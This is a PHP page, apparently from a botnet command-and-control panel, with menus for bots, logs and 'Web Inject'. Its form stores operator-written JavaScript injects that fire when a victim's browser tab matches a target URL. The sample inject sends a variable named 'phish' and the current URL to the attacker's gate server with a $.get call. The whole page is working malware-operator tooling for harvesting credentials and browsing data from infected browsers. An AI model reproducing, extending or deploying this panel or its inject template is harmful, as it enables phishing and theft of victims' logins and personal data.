<?php
require_once('class/payload.class.php');
if(isset($_POST['create']))
{
    $name = $_POST['name'];
    $code_url = $_POST['code_url'];
    $code_inject = $_POST['code_inject'];
    
    $payload = new Payload;
    $payload->setName($name);
    $payload->setUrl($code_url);
    $payload->setCode($code_inject);
    $payload->insertpayload();
    echo $payload->status;
}
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="active item">Web Inject</a>
      <a href="index.php?action=listpayload" class="item">List Web Inject</a>
      <a href="index.php?action=settings" class="item">Settings</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
        <form class="ui form" action="index.php?action=payload" method="post">
            <div class="field">
                <label>Name payload</label>
                <input type="text" name="name" placeholder="">
            </div>
            <div class="field">
        <label>Exemple code</label>
            <pre>
// VERIFIED D'URL
if(tabURL.indexOf('') !== -1 ) // url in ''
{
    Payload_exemple();
}</pre>
            </div>
        <div class="field">
        <label>Url verification code</label>
        <textarea name="code_url" rows="5"></textarea>
      </div>
            <div class="field">
        <label>Exemple code</label>
        <pre>// PAYLOAD FUNCTION NEED HTTPS
function Payload_exemple()
{
    console.log('Injected here')
    var urls = "" // Var for URL
    var phish = "" // Var for logs 
    $.get(server_web+gate_page, { info: phish, url: urls } );
}</pre>
            </div>
        <div class="field">
        <label>Payload code</label>
        <textarea name="code_inject" rows="5"></textarea>
      </div>
            <input type="submit" class="ui button" name="create" tabindex="0" value="create"/>
        </form>
    </div>
</div>